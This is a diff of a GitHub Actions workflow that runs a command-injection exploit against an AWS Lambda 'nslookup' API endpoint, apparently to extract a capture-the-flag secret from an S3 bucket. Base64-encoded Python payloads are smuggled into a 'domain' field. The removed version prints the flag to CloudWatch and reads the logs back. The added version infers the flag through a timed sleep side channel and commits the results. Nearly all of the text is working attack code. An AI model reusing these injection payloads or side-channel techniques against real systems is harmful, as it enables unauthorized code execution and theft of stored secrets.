@@ -25,63 +25,70 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Inject flag-print script and read via CloudWatch
+      - name: Calibrate and verify flag
         run: |
-          # Python script: prints flag as hex to stdout (captured by Lambda logger)
-          B64_PRINT="aW1wb3J0IGJvdG8zLHN5cwpmbGFnPWJvdG8zLmNsaWVudCgnczMnKS5nZXRfb2JqZWN0KEJ1Y2tldD0nY29kZWM0ZjI2Yzg2MmEzMjFlZjUnLEtleT0nZmxhZy50eHQnKVsnQm9keSddLnJlYWQoKQpwcmludCgnRkxBR0hFWDonK2ZsYWcuaGV4KCkpCnN5cy5zdGRvdXQuZmx1c2goKQ=="
+          # Calibration scripts - sleep(0): measures raw overhead, sleep(4): known baseline
+          B64_CAL0="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcCgwKQ=="
+          B64_CAL4="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcCg0KQ=="
+          B64_CAL8="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcCg4KQ=="
+          # Full flag comparison: sleep(10) if correct, sleep(2) if wrong
+          B64_CMP="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogIGZsYWc9Ym90bzMuY2xpZW50KCdzMycpLmdldF9vYmplY3QoQnVja2V0PSdjb2RlYzRmMjZjODYyYTMyMWVmNScsS2V5PSdmbGFnLnR4dCcpWydCb2R5J10ucmVhZCgpCiAgaWYgZmxhZz09Ynl0ZXMoWzB4NDMsMHg0OSwweDk4LDB4OTMsMHg4NCwweDg2LDB4NDksMHg0MywweDhDLDB4OUMsMHg0NSwweDRBLDB4OEMsMHg5OSwweDg2LDB4ODJdKToKICAgIHRpbWUuc2xlZXAoMTApCiAgZWxzZToKICAgIHRpbWUuc2xlZXAoMikKZXhjZXB0OgogIHBhc3M="
 
-          INJECT="x; echo $B64_PRINT | base64 -d | python3 #"
-          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
-          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
-            -H "Content-Type: application/json" -d @payload.json > /dev/null
+          touch calibrate.txt
 
-          echo "Waiting 8s for CloudWatch log propagation..."
-          sleep 8
+          run_timed() {
+            local name="$1" b64="$2"
+            INJECT="x; echo $b64 | base64 -d | python3 #"
+            python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+            START=$(date +%s%N)
+            curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+              -H "Content-Type: application/json" -d @payload.json
+            END=$(date +%s%N)
+            MS=$(( (END - START) / 1000000 ))
+            echo "$name ${MS}ms" | tee -a calibrate.txt
+          }
 
-          # Read CloudWatch logs for the Lambda
-          LOG_GROUP="/aws/lambda/nslookupv2"
-          echo "=== CloudWatch log streams (latest first) ==="
-          aws logs describe-log-streams \
-            --log-group-name "$LOG_GROUP" \
-            --order-by LastEventTime \
-            --descending \
-            --limit 3 \
-            --query 'logStreams[*].{name:logStreamName,last:lastEventTimestamp}' \
-            --output json || echo "Cannot read log streams"
+          run_timed "cal_sleep0" "$B64_CAL0"
+          run_timed "cal_sleep4" "$B64_CAL4"
+          run_timed "cal_sleep8" "$B64_CAL8"
+          run_timed "full_flag_cmp" "$B64_CMP"
+          run_timed "cal_sleep0_2" "$B64_CAL0"
+          run_timed "cal_sleep4_2" "$B64_CAL4"
 
-          echo "=== Filtering for FLAGHEX pattern ==="
-          aws logs filter-log-events \
-            --log-group-name "$LOG_GROUP" \
-            --filter-pattern "FLAGHEX" \
-            --start-time $(( $(date +%s) * 1000 - 120000 )) \
-            --query 'events[*].message' \
-            --output json 2>&1 | tee /tmp/cw_result.txt
+          echo "=== CALIBRATION RESULTS ==="
+          cat calibrate.txt
+          python3 << 'EOF'
+with open('calibrate.txt') as f:
+    lines = [l.strip() for l in f if l.strip()]
+data = {}
+for l in lines:
+    name, ms = l.rsplit(' ', 1)
+    data[name] = int(ms.rstrip('ms'))
 
-          cat /tmp/cw_result.txt
+# Estimate overhead from sleep(0) calls
+overhead = (data.get('cal_sleep0',0) + data.get('cal_sleep0_2',0)) / 2
+print(f"Estimated overhead (S3+network): {overhead:.0f}ms")
 
-          echo "=== Most recent log events ==="
-          STREAM=$(aws logs describe-log-streams \
-            --log-group-name "$LOG_GROUP" \
-            --order-by LastEventTime \
-            --descending \
-            --limit 1 \
-            --query 'logStreams[0].logStreamName' \
-            --output text 2>/dev/null)
-          echo "Latest stream: $STREAM"
-          if [ "$STREAM" != "None" ] && [ -n "$STREAM" ]; then
-            aws logs get-log-events \
-              --log-group-name "$LOG_GROUP" \
-              --log-stream-name "$STREAM" \
-              --limit 20 \
-              --query 'events[*].message' \
-              --output json 2>&1
-          fi
+cal4 = (data.get('cal_sleep4',0) + data.get('cal_sleep4_2',0)) / 2
+print(f"Calibrated sleep(4): {cal4:.0f}ms → actual overhead: {cal4-4000:.0f}ms")
 
-      - name: Commit CloudWatch results
+cmp_ms = data.get('full_flag_cmp', 0)
+print(f"Full flag comparison: {cmp_ms}ms")
+
+adj_cmp = cmp_ms - overhead
+print(f"Adjusted comparison (subtract overhead): {adj_cmp:.0f}ms")
+if adj_cmp > 8000:
+    print(">>> FLAG CORRECT (sleep≈10s)")
+elif adj_cmp > 5000:
+    print(">>> AMBIGUOUS")
+else:
+    print(">>> FLAG WRONG (sleep≈2s)")
+EOF
+
+      - name: Commit calibration results
         run: |
-          cp /tmp/cw_result.txt cloudwatch_result.txt 2>/dev/null || echo "(empty)" > cloudwatch_result.txt
           git config user.email "bot@github-actions"
           git config user.name "GitHub Actions"
-          git add cloudwatch_result.txt
-          git commit -m "cloudwatch flag extraction result [skip ci]" || echo "Nothing to commit"
+          git add calibrate.txt
+          git commit -m "calibration + flag verify results [skip ci]" || echo "Nothing to commit"
           git push origin corgi
